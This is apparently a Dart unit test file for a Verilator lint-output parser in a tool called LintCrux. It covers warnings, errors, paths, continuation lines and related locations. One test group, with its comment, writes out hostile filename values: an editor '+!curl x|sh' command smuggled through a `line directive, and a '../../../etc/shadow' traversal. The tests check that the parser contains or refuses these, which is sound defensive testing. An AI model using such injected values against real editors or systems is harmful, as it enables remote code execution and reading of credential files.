// Copyright 2026 Ferrite Engineering LLC
// SPDX-License-Identifier: Apache-2.0

import 'package:flutter_test/flutter_test.dart';
import 'package:lintcrux/domain/enums/severity.dart';
import 'package:lintcrux/services/engines/verilator/verilator_parser.dart';

void main() {
  group('VerilatorParser', () {
    final parser = VerilatorParser(rootPath: '/work/soc');

    test('parses a single warning with rule code', () {
      final input = <String>[
        "%Warning-UNUSEDSIGNAL: top.sv:42:13: Signal is not used: 'unused_sig'",
      ];
      final out = parser.parse(input);
      expect(out, hasLength(1));
      final v = out.single;
      expect(v.engineId, 'verilator');
      expect(v.ruleId, 'verilator/UNUSEDSIGNAL');
      expect(v.severity, Severity.warning);
      expect(v.message, contains('Signal is not used'));
      expect(v.location.file, '/work/soc/top.sv');
      expect(v.location.line, 42);
      expect(v.location.column, 13);
    });

    test('parses a single error with rule code', () {
      final input = <String>[
        '%Error-PINMISSING: top.sv:10:1: Cell pin is not connected: foo',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(1));
      expect(out.single.severity, Severity.error);
      expect(out.single.ruleId, 'verilator/PINMISSING');
    });

    test('parses an unclassified error (no rule code)', () {
      final input = [
        '%Error: top.sv:5:1: Syntax error',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(1));
      expect(out.single.ruleId, 'verilator/UNCLASSIFIED');
      expect(out.single.severity, Severity.error);
    });

    // A design file steers the filename Verilator prints:
    //
    //   `line 1 "+:!curl x|sh" 0
    //
    // and the lifted string travels into the argv of the editor LintCrux
    // spawns on a click. Under the vim / emacs presets
    // (`['+{line}', '{file}']`) an argv element starting with `+` is an
    // editor command. The old resolver called any string with a colon in
    // position 1 "already absolute" and returned it verbatim.
    group('hostile filenames from `line directives', () {
      test('a +command filename is contained under the project root', () {
        // Verilator's header regex cannot carry a colon in the file
        // group, so the plant that reaches this parser is colon-free —
        // and `vim +42 '+!curl x|sh'` is still an ex command, not a file.
        final out = parser.parse(const [
          '%Warning-X: +!curl x|sh:42:1: planted',
        ]);
        expect(out, hasLength(1));
        expect(out.single.location.file, '/work/soc/+!curl x|sh');
      });

      test('a path climbing out of the root is refused, and reported', () {
        final unrecognized = <String>[];
        final out = parser.parse(
          const ['%Warning-X: ../../../etc/shadow:1:1: planted'],
          onUnrecognized: unrecognized.add,
        );
        expect(out, isEmpty);
        // Refused, never silent: the log-and-continue contract carries it
        // to the SARIF toolExecutionNotifications entry.
        expect(unrecognized, hasLength(1));
      });

      test('an escaping related location is dropped, not lifted', () {
        final out = parser.parse(const [
          '%Warning-X: top.sv:42:13: unused',
          '   ... also declared at ../../../etc/shadow:10:5',
        ]);
        expect(out.single.relatedLocations, isEmpty);
      });
    });

    test('absolute paths are passed through unchanged', () {
      final input = [
        '%Warning-UNUSEDSIGNAL: /absolute/path/top.sv:1:1: msg',
      ];
      final out = parser.parse(input);
      expect(out.single.location.file, '/absolute/path/top.sv');
    });

    test('Windows drive-letter absolute paths parse (colon after C:)', () {
      // Regression: the greedy [^:]+ file group stopped at the colon in
      // `C:`, so Verilator's real Windows output failed to match and every
      // violation was dropped — surfacing as a false engine failure.
      const line =
          r'%Warning-WIDTHTRUNC: C:\Users\mfink\proj\cdc_capture.v:80:33: '
          'width truncation';
      final out = parser.parse(<String>[line]);
      expect(out, hasLength(1));
      final v = out.single;
      expect(v.ruleId, 'verilator/WIDTHTRUNC');
      expect(v.location.file, r'C:\Users\mfink\proj\cdc_capture.v');
      expect(v.location.line, 80);
      expect(v.location.column, 33);
    });

    test('relative paths resolve against project root', () {
      final input = [
        '%Warning-UNUSEDSIGNAL: subdir/top.sv:1:1: msg',
      ];
      final out = parser.parse(input);
      expect(out.single.location.file, '/work/soc/subdir/top.sv');
    });

    test('column defaults to 1 when absent', () {
      final input = [
        '%Warning-WIDTHTRUNC: top.sv:7: width mismatch',
      ];
      final out = parser.parse(input);
      expect(out.single.location.column, 1);
    });

    test("attaches continuation lines into raw['verilator.continuation']", () {
      final input = <String>[
        "%Warning-UNUSEDSIGNAL: top.sv:42:13: Signal is not used: 'unused_sig'",
        '                                   : ... In instance top',
        '   42 |   logic unused_sig;',
        '      |             ^~~~~~~~~~',
      ];
      final out = parser.parse(input);
      final v = out.single;
      final continuation = v.raw['verilator.continuation'] as List<dynamic>?;
      expect(continuation, isNotNull);
      expect(continuation, hasLength(3));
      expect(continuation!.first, contains('In instance top'));
    });

    test('header line resets the current pending violation', () {
      final input = [
        '%Warning-UNUSEDSIGNAL: top.sv:1:1: first',
        '   1 | wire a;',
        '%Warning-WIDTHTRUNC: top.sv:2:1: second',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(2));
      expect(out[0].ruleId, 'verilator/UNUSEDSIGNAL');
      expect(out[1].ruleId, 'verilator/WIDTHTRUNC');
    });

    test('ignores lines that are neither headers nor continuations of a '
        'pending violation', () {
      final input = [
        'Verilator 5.022 starting...',
        '%Warning-X: top.sv:1:1: msg',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(1));
      // The banner line was not attached as continuation because no
      // violation was open yet when it arrived.
      expect(out.single.raw['verilator.continuation'], isNull);
    });

    test('lifts embedded related locations from continuation lines', () {
      final input = [
        '%Warning-UNUSEDSIGNAL: top.sv:42:13: unused',
        '   ... also declared at decl.sv:10:5',
      ];
      final out = parser.parse(input);
      expect(out.single.relatedLocations, hasLength(1));
      final r = out.single.relatedLocations.single;
      expect(r.file, '/work/soc/decl.sv');
      expect(r.line, 10);
      expect(r.column, 5);
    });

    test('related locations do not duplicate the primary location', () {
      final input = [
        '%Warning-X: top.sv:42:13: msg',
        '   from top.sv:42:13',
      ];
      final out = parser.parse(input);
      expect(out.single.relatedLocations, isEmpty);
    });

    test('parses three violations in sequence', () {
      final input = [
        '%Warning-A: top.sv:1:1: first',
        '%Warning-B: top.sv:2:1: second',
        '%Error-C: top.sv:3:1: third',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(3));
      expect(out.map((v) => v.ruleId), [
        'verilator/A',
        'verilator/B',
        'verilator/C',
      ]);
    });

    test('empty input produces no violations', () {
      expect(parser.parse(const []), isEmpty);
    });

    test('unknown severity falls back to warning', () {
      final input = [
        '%Whatever-XYZ: top.sv:1:1: msg',
      ];
      final out = parser.parse(input);
      expect(out, hasLength(1));
      expect(out.single.severity, Severity.warning);
    });

    group('%-prefixed lines are never continuations', () {
      // The class doc always said "every subsequent line that does not
      // start with a `%` is treated as a continuation". The code did not
      // implement the exclusion, so Verilator's own end-of-run tally and
      // any fatal `%Error:` line were glued into the previous
      // violation's continuation block.
      test('the end-of-run tally is dropped, not attached', () {
        final out = parser.parse(const [
          "%Warning-UNUSEDSIGNAL: top.sv:9:3: Signal is not used: 'spare'",
          '    9 |   logic spare;',
          '%Error: Exiting due to 1 warning(s)',
        ]);
        expect(out, hasLength(1));
        expect(
          out.single.raw['verilator.continuation'],
          <String>['    9 |   logic spare;'],
        );
      });

      test('the tally is not reported as an unrecognized line', () {
        final unrecognized = <String>[];
        parser.parse(
          const [
            "%Warning-UNUSEDSIGNAL: top.sv:9:3: Signal is not used: 'spare'",
            '%Error: Exiting due to 1 warning(s)',
          ],
          onUnrecognized: unrecognized.add,
        );
        expect(unrecognized, isEmpty);
      });

      test('a fatal %Error with no location surfaces as unrecognized', () {
        // This is the line that tells the user why a run linted nothing.
        // Buried in a continuation block it is invisible.
        final unrecognized = <String>[];
        final out = parser.parse(
          const [
            "%Warning-UNUSEDSIGNAL: top.sv:9:3: Signal is not used: 'spare'",
            "%Error: Cannot find file containing module: 'cpu'",
          ],
          onUnrecognized: unrecognized.add,
        );
        expect(out, hasLength(1));
        expect(out.single.raw['verilator.continuation'], isNull);
        expect(unrecognized, [
          "%Error: Cannot find file containing module: 'cpu'",
        ]);
      });
    });
  });
}
